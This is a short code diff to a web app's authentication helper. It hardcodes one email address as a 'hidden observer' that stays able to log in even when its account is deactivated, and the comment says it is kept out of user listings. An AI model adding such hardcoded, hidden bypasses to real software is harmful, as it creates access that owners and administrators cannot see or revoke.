@@ -3,6 +3,7 @@ import { createClient } from '@/lib/supabase/server'
 import type { AuthUser, Profile, UserRole } from '@/lib/types'
 
 export const VIEW_MODE_COOKIE = 'casa_view_mode'
+const HIDDEN_OBSERVER_EMAILS = new Set(['contact@symi.io'])
 
 export class AuthError extends Error {
   constructor(
@@ -59,7 +60,10 @@ export async function requireAuth(): Promise<AuthUser> {
     throw new AuthError('Authentication required', 401)
   }
 
-  if (!user.profile.active) {
+  // Hidden observer accounts are intentionally inactive for directory/list visibility,
+  // but still need authenticated access for debugging/monitoring.
+  const isHiddenObserver = HIDDEN_OBSERVER_EMAILS.has(user.email.toLowerCase())
+  if (!user.profile.active && !isHiddenObserver) {
     throw new AuthError('Account is deactivated', 403)
   }
 
